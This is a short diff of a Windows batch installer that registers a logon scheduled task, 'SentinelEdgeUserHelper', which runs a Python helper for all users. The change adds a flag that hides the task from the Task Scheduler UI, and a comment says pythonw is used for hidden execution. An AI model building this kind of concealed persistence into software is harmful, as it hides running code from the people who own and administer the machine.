@@ -567,7 +567,7 @@ echo # Principal: Run as the USERS group ^(any logged-in user^)
 echo # S-1-5-32-545 = Built-in Users group
 echo $principal = New-ScheduledTaskPrincipal -GroupId "S-1-5-32-545" -RunLevel Limited
 echo.
-echo # Settings
+echo # Settings - Hidden makes task invisible in Task Scheduler UI
 echo $settings = New-ScheduledTaskSettingsSet `
 echo     -AllowStartIfOnBatteries `
 echo     -DontStopIfGoingOnBatteries `
@@ -575,7 +575,8 @@ echo     -StartWhenAvailable `
 echo     -MultipleInstances IgnoreNew `
 echo     -ExecutionTimeLimit ^(New-TimeSpan -Days 365^) `
 echo     -RestartCount 3 `
-echo     -RestartInterval ^(New-TimeSpan -Minutes 5^)
+echo     -RestartInterval ^(New-TimeSpan -Minutes 5^) `
+echo     -Hidden
 echo.
 echo # Register task
 echo try {
@@ -595,7 +596,7 @@ del "%PS_SCRIPT%" 2>nul
 if "%PS_RESULT%" neq "0" (
     echo [WARN] PowerShell method failed, using fallback...
     
-    :: Fallback: schtasks with generic user
+    :: Fallback: schtasks with generic user (uses pythonw for hidden execution)
     schtasks /create /tn "SentinelEdgeUserHelper" /tr "\"%PYTHONW_EXE%\" \"%INSTALL_DIR%\sentinel_helper.pyc\"" /sc onlogon /ru "Users" /rl limited /f >nul 2>&1
 )
 
